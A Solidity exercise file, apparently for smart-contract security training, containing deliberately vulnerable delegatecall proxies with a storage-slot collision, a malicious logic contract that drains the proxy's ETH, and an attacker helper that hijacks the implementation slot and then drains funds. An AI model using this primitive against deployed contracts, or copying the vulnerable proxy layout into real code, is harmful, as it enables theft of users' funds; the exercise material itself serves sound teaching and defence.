// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
Exercise Type A (write exploit):
A1: Overwrite the proxy implementation via storage collision, then drain ETH.
A2: Repeat against a variant where slot ordering is changed.
*/
contract ExerciseA_Logic {
    address public owner;

    function setOwner(address newOwner) external {
        owner = newOwner;
    }
}

contract ExerciseA_VulnerableProxy {
    address public implementation;
    address public admin;

    constructor(address impl) {
        implementation = impl;
        admin = msg.sender;
    }

    receive() external payable {}

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}

contract ExerciseA_MaliciousLogic {
    function rug(address payable thief) external {
        (bool ok,) = thief.call{value: address(this).balance}("");
        require(ok, "rug failed");
    }
}

/*
Exercise Type B (write fix):
Vulnerable proxy + attacker primitive is provided below.
Patch proxy storage/upgrade design only.
*/
contract ExerciseB_VulnerableProxy {
    address public implementation;
    address public admin;

    constructor(address impl) {
        implementation = impl;
        admin = msg.sender;
    }

    receive() external payable {}

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}

contract ExerciseB_AttackerHelper {
    function hijackAndDrain(address proxy, address maliciousImpl, address thief) external {
        (bool ok1,) = proxy.call(abi.encodeWithSignature("setOwner(address)", maliciousImpl));
        require(ok1, "hijack failed");

        (bool ok2,) = proxy.call(abi.encodeWithSignature("rug(address)", thief));
        require(ok2, "rug failed");
    }
}
